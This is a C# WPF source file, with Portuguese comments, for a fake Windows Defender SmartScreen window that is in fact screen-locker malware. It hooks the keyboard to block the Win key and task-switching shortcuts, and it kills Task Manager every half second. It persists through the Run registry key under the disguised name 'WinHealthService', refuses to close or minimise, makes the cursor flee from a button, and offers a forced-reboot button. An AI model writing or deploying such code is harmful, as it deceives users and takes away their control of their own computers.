using System;
using System.Windows;
using System.Windows.Media;
using System.Diagnostics;
using Microsoft.Win32;
using System.ComponentModel;
using System.Windows.Input;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Windows.Threading; // Necessário para o Timer

namespace WinDefenderSmartScreen
{
    public partial class MainWindow : Window
    {
        // --- API NATIVA PARA MOUSE E TECLADO ---
        [DllImport("user32.dll")]
        static extern bool SetCursorPos(int x, int y);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;

        // --- PROPERTIES PARA TEMA ---
        public static readonly DependencyProperty CorFundoProperty = DependencyProperty.Register("CorFundo", typeof(Brush), typeof(MainWindow));
        public Brush CorFundo { get => (Brush)GetValue(CorFundoProperty); set => SetValue(CorFundoProperty, value); }
        public static readonly DependencyProperty CorTextoPrincipalProperty = DependencyProperty.Register("CorTextoPrincipal", typeof(Brush), typeof(MainWindow));
        public Brush CorTextoPrincipal { get => (Brush)GetValue(CorTextoPrincipalProperty); set => SetValue(CorTextoPrincipalProperty, value); }
        public static readonly DependencyProperty CorTextoSecundarioProperty = DependencyProperty.Register("CorTextoSecundario", typeof(Brush), typeof(MainWindow));
        public Brush CorTextoSecundario { get => (Brush)GetValue(CorTextoSecundarioProperty); set => SetValue(CorTextoSecundarioProperty, value); }
        public static readonly DependencyProperty CorBordaProperty = DependencyProperty.Register("CorBorda", typeof(Brush), typeof(MainWindow));
        public Brush CorBorda { get => (Brush)GetValue(CorBordaProperty); set => SetValue(CorBordaProperty, value); }

        private bool _podeFechar = false;
        private DispatcherTimer _antiTaskTimer;

        public MainWindow()
        {
            InitializeComponent();
            ConfigurarTema();
            AtualizarHorario();
            GarantirStartup();
            IniciarAntiTask(); 

            _hookID = SetHook(_proc);

            // Bloqueia Win+D e minimização
            this.StateChanged += (s, e) => {
                if (this.WindowState == WindowState.Minimized && !_podeFechar)
                {
                    this.WindowState = WindowState.Normal;
                    this.Activate();
                }
            };

            // Kill Switch: Ctrl + Shift + Alt + K
            this.KeyDown += (s, e) => {
                if (e.Key == Key.K && Keyboard.Modifiers == (ModifierKeys.Control | ModifierKeys.Shift | ModifierKeys.Alt))
                {
                    _podeFechar = true;
                    _antiTaskTimer.Stop(); // Para de fechar o gerenciador
                    UnhookWindowsHookEx(_hookID);
                    LimparRegistro();
                    Application.Current.Shutdown();
                }
            };
        }

        private void IniciarAntiTask()
        {
            _antiTaskTimer = new DispatcherTimer();
            _antiTaskTimer.Interval = TimeSpan.FromMilliseconds(500); // Verifica 2 vezes por segundo
            _antiTaskTimer.Tick += (s, e) => {
                Process[] procs = Process.GetProcessesByName("taskmgr");
                foreach (var proc in procs)
                {
                    try { proc.Kill(); } catch { } // Fecha o Gerenciador de Tarefas
                }
            };
            _antiTaskTimer.Start();
        }

        // --- LÓGICA DO HOOK DE TECLADO ---
        private IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                Key key = KeyInterop.KeyFromVirtualKey(vkCode);
                // Bloqueia Win, Alt+Tab, Alt+Esc, Ctrl+Esc
                if (key == Key.LWin || key == Key.RWin || (Keyboard.Modifiers == ModifierKeys.Alt && key == Key.Tab) ||
                    (Keyboard.Modifiers == ModifierKeys.Alt && key == Key.Escape) || (Keyboard.Modifiers == ModifierKeys.Control && key == Key.Escape))
                    return (IntPtr)1;
            }
            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        private void FugirMouse_MouseEnter(object sender, MouseEventArgs e)
        {
            if (!_podeFechar)
            {
                Random rnd = new Random();
                SetCursorPos(rnd.Next(100, (int)SystemParameters.PrimaryScreenWidth - 100),
                             rnd.Next(100, (int)SystemParameters.PrimaryScreenHeight - 100));
            }
        }

        private void ConfigurarTema()
        {
            try
            {
                int light = (int)Registry.GetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Themes\Personalize", "AppsUseLightTheme", 1);
                bool isDark = light == 0;
                CorFundo = isDark ? new SolidColorBrush(Color.FromRgb(31, 31, 31)) : Brushes.White;
                CorTextoPrincipal = isDark ? Brushes.White : Brushes.Black;
                CorTextoSecundario = Brushes.Gray;
                CorBorda = isDark ? new SolidColorBrush(Color.FromRgb(51, 51, 51)) : Brushes.LightGray;
            }
            catch { CorFundo = Brushes.White; }
        }

        private void AtualizarHorario()
        {
            TxtDataHora.Text = DateTime.Now.ToString("dd/MM/yyyy HH:mm");
            TxtDataDetalhe.Text = "Data: " + TxtDataHora.Text;
        }

        private void GarantirStartup()
        {
            try { Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true).SetValue("WinHealthService", Process.GetCurrentProcess().MainModule.FileName); } catch { }
        }

        private void LimparRegistro()
        {
            try { Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true).DeleteValue("WinHealthService", false); } catch { }
        }

        private void BtnReiniciar_Click(object sender, RoutedEventArgs e)
        {
            _podeFechar = true;
            _antiTaskTimer.Stop();
            UnhookWindowsHookEx(_hookID);
            Process.Start(new ProcessStartInfo("shutdown", "/r /t 0 /f") { CreateNoWindow = true });
            Application.Current.Shutdown();
        }

        private async void BtnFecharFalso_Click(object sender, RoutedEventArgs e)
        {
            this.Hide();
            await Task.Delay(10000);
            AtualizarHorario();
            if (!_podeFechar) { this.Show(); this.Activate(); }
        }

        protected override async void OnClosing(CancelEventArgs e)
        {
            if (!_podeFechar)
            {
                e.Cancel = true;
                this.Hide();
                await Task.Delay(10000);
                this.Show();
            }
        }

        protected override void OnDeactivated(EventArgs e)
        {
            if (!_podeFechar) { this.Topmost = true; this.Activate(); }
        }
    }
}